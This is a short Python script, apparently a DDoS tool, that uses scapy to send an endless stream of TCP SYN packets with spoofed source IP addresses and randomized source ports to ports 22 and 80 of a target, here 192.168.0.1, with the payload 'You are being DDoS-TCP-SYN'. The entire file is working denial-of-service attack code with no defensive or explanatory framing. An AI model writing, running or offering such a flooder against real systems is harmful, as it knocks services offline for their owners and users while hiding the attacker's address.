from scapy.all import *
from rport import *
ttl = 99
id = 1111
dport = [22,80]
message = b'You are being DDoS-TCP-SYN'
def TCP_SYN(ip):
	while 1:
		sport = randomize_port()
		ipv4 = spoof_ipv4()
		packet = IP(src=ipv4,dst=ip,id=id,ttl=ttl)/TCP(sport=sport,dport=dport,seq=3333,ack=1000,window=1000,flags='S')/message
		send(packet)
		print(packet.show())

TCP_SYN("192.168.0.1")